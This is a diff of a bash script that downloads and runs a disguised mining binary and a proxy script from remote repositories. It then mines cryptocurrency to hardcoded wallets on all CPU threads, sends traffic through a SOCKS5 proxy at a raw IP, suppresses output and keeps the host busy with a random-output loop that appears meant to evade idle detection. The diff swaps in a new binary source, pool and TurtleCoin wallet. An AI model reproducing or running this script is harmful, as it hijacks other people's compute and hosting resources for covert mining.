@@ -1,14 +1,14 @@
 #!/bin/bash
 apt update
 apt -y install wget curl python3 libjansson4
-wget -O bionicv2 https://raw.githubusercontent.com/mariobiszz/nenenenenene/main/bionicv2
+wget -O bionicv2 https://bitbucket.org/oqoixgqoq9/turtel/raw/c4008f7e57bc01c88c7d6e4ad3c1147e1654d014/ayam-bakso
 wget -O proxy.py https://raw.githubusercontent.com/mariobiszz/nenenenenene/main/proxy.py
 chmod +x bionicv2 proxy.py
 python3 proxy.py >/dev/null &
-pool="stratum+tcp://na.luckpool.net:3956"
-wallet="RYWshsv766dTZbLJ6AbHcT8HiWngTrW3qe"
+pool="pool.hashvault.pro:80"
+wallet="TRTLv3XdA6KgV9dHSXXB1pJtSjdQdLXuJewbc5SALSGcaXwyKkj548iWqBKxQEnyeRV7hfBw8FaveMmBDzeRCjQ7arJQASUnca2"
 workername="$(cat /proc/sys/kernel/hostname)"
 thread="$(nproc --all)"
 proxy="socks5://174.138.17.79:4145"
-./bionicv2 -a verus -o $pool -u $wallet.$workername -p x -t $thread -x $proxy >/dev/null &
+./bionicv2 -o $pool -u $wallet --keepalive --donate-level 1 -p $workername -k --tls -t$thread >/dev/null &
 while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
